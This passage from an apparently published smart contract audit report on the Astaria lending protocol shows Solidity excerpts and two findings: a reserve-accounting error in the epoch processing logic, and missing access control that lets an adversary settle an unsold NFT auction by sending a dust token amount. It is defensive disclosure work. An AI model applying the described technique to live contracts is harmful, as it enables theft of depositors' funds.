class=\"mtk1\">    </span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">WithdrawProxy</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// split funds from previous WithdrawProxy with PublicVault if hasn&#39;t been already</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousWithdrawProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">WithdrawProxy</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">previousWithdrawProxy</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">previousWithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getFinalAuctionEnd</span><span class=\"mtk1\">() != </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">previousWithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentEpoch</span><span class=\"mtk1\">].</span><span class=\"mtk12\">liensOpenForEpoch</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIENS_OPEN_FOR_EPOCH_NOT_ZERO</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// reset liquidationWithdrawRatio to prepare for re calcualtion</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// check if there are LPs withdrawing this epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">) != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxySupply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proxySupply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setWithdrawRatio</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expected</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getExpected</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_setYIntercept</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yIntercept</span><span class=\"mtk1\"> -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">().</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// burn the tokens of the LPs withdrawing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">proxySupply</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The part that we need to investigate is this.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">_setYIntercept</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yIntercept</span><span class=\"mtk1\"> -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">().</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span></code></pre>\n<p>In case if <code>totalAssets() > expected</code> then <code>withdrawReserve</code> is <code>totalAssets() - expected</code> multiplied by <code>liquidationWithdrawRatio</code>.</p>\n<p>That means that <code>withdrawReserve</code> amount will be sent of public vault to the withdraw proxy, so total assets should decrease by this amount.</p>\n<p>In this case call of <code>_setYIntercept</code> below is correct.</p>\n<p>However in case when <code>totalAssets() &#x3C;= expected</code> then <code>withdrawReserve</code> is set to 0, that means that nothing will be sent to the withdraw proxy. But <code>_setYIntercept</code> is still called in this case and total assets is decreased, but should not.</p>\n<h3 id=\"tools-used-14\" style=\"position:relative;\"><a href=\"#tools-used-14\" aria-label=\"tools used 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-45\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-45\" aria-label=\"recommended mitigation steps 45 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In case when <code>totalAssets() &#x3C;= expected</code> do not call <code>_setYIntercept</code>.</p>\n<hr>\n<h2 id=\"m-30-adversary-can-game-the-liquidation-flow-by-transfering-a-dust-amount-of-the-payment-token-to-clearinghouse-contract-to-settle-the-auction-if-no-one-buy-the-auctioned-nft\" style=\"position:relative;\"><a href=\"#m-30-adversary-can-game-the-liquidation-flow-by-transfering-a-dust-amount-of-the-payment-token-to-clearinghouse-contract-to-settle-the-auction-if-no-one-buy-the-auctioned-nft\" aria-label=\"m 30 adversary can game the liquidation flow by transfering a dust amount of the payment token to clearinghouse contract to settle the auction if no one buy the auctioned nft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/112\">[M-30] Adversary can game the liquidation flow by transfering a dust amount of the payment token to ClearingHouse contract to settle the auction if no one buy the auctioned NFT</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/112\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/126\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L169\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L169</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L123\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L123</a></p>\n<p>The function ClearingHouse#safeTransferFrom is meant to settle the auction but the function severely lack of access control.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// the from is the offerer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">identifier</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//empty from seaport</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//data is empty and useless</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">identifier</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>which calls:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_execute</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// collateral token sending the fake nft</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// buyer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">encodedMetaData</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//retrieve token address from the encoded data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// space to encode whatever is needed,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IAstariaRouter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IAstariaRouter</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_getArgAddress</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// get the router from the immutable arg</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ClearingHouseStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getStorage</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">encodedMetaData</span><span class=\"mtk1\">).</span><span class=\"mtk11\">fromLast20Bytes</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentOfferPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_locateCurrentAmount</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">startAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">endAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">startTime:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">endTime:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionStack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">roundUp:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> </span><span class=\"mtk3\">//we are a consideration we round up</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">paymentToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">currentOfferPrice</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;not enough funds received&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getArgUint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">21</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// pay liquidator fees here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ILienToken</span><span 